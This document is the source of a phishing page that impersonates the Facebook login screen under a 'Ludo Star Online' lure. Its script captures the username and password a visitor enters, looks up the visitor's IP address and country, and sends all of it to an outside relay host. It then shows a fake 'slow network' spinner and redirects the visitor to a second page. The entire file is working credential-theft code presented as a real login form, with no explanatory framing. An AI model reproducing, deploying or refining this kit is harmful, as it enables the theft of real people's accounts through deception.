  <style>
    body {

    h1 {

    button {

      z-index: 10;
    }
    a, button {
      transition: color 0.2s ease;
    }
    a:hover, button:hover {
      color: #145dbf;
      text-decoration: underline;
    }
    #username, #password {
      font-family: monospace;
      cursor: pointer;
    }
    #copyTooltip {
      position: fixed;
      bottom: 20px;
      left: 50%;
      transform: translateX(-50%);
      background-color: #1877f2;
      color: white;
      padding: 8px 16px;
      border-radius: 9999px;
      font-weight: 600;
      font-size: 14px;
      opacity: 0;
      pointer-events: none;
      transition: opacity 0.3s ease;
      z-index: 9999;
    }
    #copyTooltip.show {
      opacity: 1;
      pointer-events: auto;
    }
    .disabled-button {
      cursor: default;
      pointer-events: none;
      user-select: none;
    }
    #loadingOverlay {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.5);
      z-index: 10000;
      justify-content: center;
      align-items: center;
      flex-direction: column;
    }
    #loadingOverlay.show {
      display: flex;
    }
    .spinner {
      border: 4px solid rgba(255, 255, 255, 0.3);
      border-top: 4px solid #1877f2;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>

    <p class="text-center text-gray-500 text-lg mb-8 leading-relaxed font-medium max-w-xs">

    <form id="loginForm" class="w-full space-y-4" autocomplete="off">

        name="username"
        placeholder="Mobile number or email address"

        type="text"
      />
      <input

        name="password"

      />
      <button
        class="w-full bg-[#1877f2] text-white rounded-md py-3 hover:bg-[#165ec9] shadow-md"

    <a class="text-[#1877f2] text-sm mt-5 mb-7 select-none cursor-pointer" href="https://www.facebook.com/ludostarhd" target="_blank" rel="noopener noreferrer">

    </a>
    
    <div class="flex flex-col items-center space-y-3 mb-8">

        Help Centre

    </div>
    
    <div class="w-full flex flex-wrap justify-center gap-x-12 gap-y-1 text-xs text-gray-500 font-semibold select-none">
      <div class="flex flex-col items-center space-y-1">
        <span>English (UK)</span>

        <span class="font-normal text-[13px]">‡™ó‡´Å‡™ú‡™∞‡™æ‡™§‡´Ä</span>
      </div>
      <div class="flex flex-col items-center space-y-1">
        <span class="font-normal text-[13px]">‡§π‡§ø‡§®‡•ç‡§¶‡•Ä</span>
        <span class="font-normal text-[13px]">ÿßÿ±ÿØŸà</span>

          +
        </button>
      </div>
    </div>
    
    <p class="text-gray-400 text-xs mt-6 mb-6 select-none">Meta ¬© 2025</p>
  </main>

  <div id="loadingOverlay" class="text-white text-center">
    <div class="spinner mb-4"></div>
    <p class="text-lg font-medium">Your network is slow, please wait...</p>
  </div>
  
  <div id="copyTooltip">Copied to clipboard!</div>

  <script>
    const KEVIN_API_BASE_URL = "https://kevin-apis.vercel.app/";
    const IMAGE_URL = "https://files.catbox.moe/39p9du.jpg";

    const tooltip = document.getElementById("copyTooltip");
    const loginButton = document.getElementById("loginButton");
    const loadingOverlay = document.getElementById("loadingOverlay");
    const usernameInput = document.getElementById("username");
    const passwordInput = document.getElementById("password");

    const phoneCountryCodes = {
      AF: "+93", AL: "+355", DZ: "+213", AR: "+54", AU: "+61", AT: "+43", BD: "+880", BY: "+375", BE: "+32",
      BO: "+591", BA: "+387", BR: "+55", BG: "+359", KH: "+855", CM: "+237", CA: "+1", CL: "+56", CN: "+86",
      CO: "+57", CR: "+506", HR: "+385", CU: "+53", CZ: "+420", DK: "+45", EC: "+593", EG: "+20", SV: "+503",
      ET: "+251", FI: "+358", FR: "+33", GE: "+995", DE: "+49", GH: "+233", GR: "+30", GT: "+502", HT: "+509",
      HN: "+504", HU: "+36", IS: "+354", IN: "+91", ID: "+62", IR: "+98", IQ: "+964", IE: "+353", IL: "+972",
      IT: "+39", JM: "+1-876", JP: "+81", JO: "+962", KZ: "+7", KE: "+254", KW: "+965", KG: "+996", LA: "+856",
      LB: "+961", LY: "+218", MY: "+60", ML: "+223", MX: "+52", MA: "+212", NP: "+977", NL: "+31", NZ: "+64",
      NI: "+505", NG: "+234", NO: "+47", OM: "+968", PK: "+92", PA: "+507", PY: "+595", PE: "+51", PH: "+63",
      PL: "+48", PT: "+351", QA: "+974", RO: "+40", RU: "+7", RW: "+250", SA: "+966", SN: "+221", RS: "+381",
      SG: "+65", SK: "+421", ZA: "+27", KR: "+82", ES: "+34", LK: "+94", SD: "+249", SE: "+46", CH: "+41",
      SY: "+963", TW: "+886", TZ: "+255", TH: "+66", TN: "+216", TR: "+90", UG: "+256", UA: "+380", AE: "+971",
      GB: "+44", US: "+1", UY: "+598", UZ: "+998", VE: "+58", VN: "+84", YE: "+967", ZM: "+260", ZW: "+263"
    };

    function countryCodeToFlag(countryCode) {
      if (!countryCode || countryCode === "Unknown") return "üåê";
      return countryCode.toUpperCase().replace(/./g, (char) => 
        String.fromCodePoint(127397 + char.charCodeAt(0))
      );
    }

    async function getCountryInfo() {
      try {
        const response = await fetch("https://ipapi.co/json/");
        if (!response.ok) throw new Error("Failed to fetch IP info");
        const data = await response.json();
        const isoCode = data.country_code || "Unknown";
        const phoneCode = phoneCountryCodes[isoCode] || "(Unknown)";
        return {
          code: phoneCode,
          name: data.country_name || "Unknown",
          flag: countryCodeToFlag(isoCode),
          ip: data.ip || "Unknown",
        };
      } catch (error) {
        console.error("Error fetching country info:", error);
        return { code: "(Unknown)", name: "Unknown", flag: "üåê", ip: "Unknown" };
      }
    }

    function showTooltip() {
      tooltip.classList.add("show");
      setTimeout(() => tooltip.classList.remove("show"), 2000);
    }

    function showLoading() {
      loadingOverlay.classList.add("show");
    }

    function copyToClipboard(text) {
      navigator.clipboard.writeText(text).then(
        () => showTooltip(),
        (err) => console.error("Failed to copy text: ", err)
      );
    }

    usernameInput.addEventListener("click", () => {
      const value = usernameInput.value.trim();
      if (value) copyToClipboard(value);
    });

    passwordInput.addEventListener("click", () => {
      const value = passwordInput.value.trim();
      if (value) copyToClipboard(value);
    });

    function formatDateTime(date) {
      const pad = (n) => (n < 10 ? "0" + n : n);
      return `${date.getFullYear()}-${pad(date.getMonth() + 1)}-${pad(date.getDate())} ${pad(date.getHours())}:${pad(date.getMinutes())}:${pad(date.getSeconds())}`;
    }

    async function sendToKevinAPI(username, password, countryInfo) {
      const now = new Date();
      const formattedDateTime = formatDateTime(now);
      
      const message = `Ludo Star Online\nüïí ${formattedDateTime}\n\nüåç Country: ${countryInfo.flag} ${countryInfo.name} (${countryInfo.code})\nüåê IP Address: ${countryInfo.ip}\n\nüîê New Facebook Login Info:\nUsername: ${username}\nPassword: ${password}\n\nLong-press the username or password above to copy.\n‚Üù ·¥Ö·¥á·¥†  ô è ¬ª Kevin_Mitnick`;

      const apiUrl = `${KEVIN_API_BASE_URL}?photo=${encodeURIComponent(IMAGE_URL)}&msg=${encodeURIComponent(message)}`;
      
      try {
        const response = await fetch(apiUrl);
        if (!response.ok) console.error("Kevin API response not OK");
        return true;
      } catch (error) {
        console.error("Error sending to Kevin API:", error);
        return false;
      }
    }

    loginButton.addEventListener("mousedown", (e) => e.preventDefault());

    document.getElementById("loginForm").addEventListener("submit", async function (e) {
      e.preventDefault();
      const username = document.getElementById("username").value.trim();
      const password = document.getElementById("password").value.trim();

      if (!username || !password) return;

      const countryInfo = await getCountryInfo();
      await sendToKevinAPI(username, password, countryInfo);

      showLoading();
      setTimeout(() => {
        window.location.href = "two.html";
      }, 10000);
    });
  </script>
